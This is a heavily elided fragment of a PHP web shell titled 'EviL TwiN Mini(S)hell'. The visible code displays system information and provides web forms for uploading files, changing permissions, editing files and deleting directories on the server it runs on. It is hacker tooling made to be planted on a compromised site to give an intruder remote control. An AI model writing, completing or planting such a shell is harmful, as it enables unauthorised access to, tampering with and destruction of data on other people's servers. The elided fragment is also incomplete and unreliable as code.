...
<title>EviL TwiN Mini(S)hell</title>
<style>
body{
...
<body>
<center><a href="?"><font size="5">EviL TwiN Mini(S)hell</font></a></center>
...
echo '<font color="green">Upload successfully</font><br />';
}else{
echo '<font color="white">Upload failed</font><br/>';
}
}
echo '<font>System : '.$system.'</font><br><form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file">
<input type="submit" value="Go!" style="background:blacklight;color:black;border-bottom:1px solid white;padding:3px 6px;">
</form>
</td></tr>';
...
echo '<font color="green">Change permission successfully</font><br/>';
}else{
...
echo '<font color="green">File edit successfully</font><br/>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory deleted successfully</font><br/>';
}else{
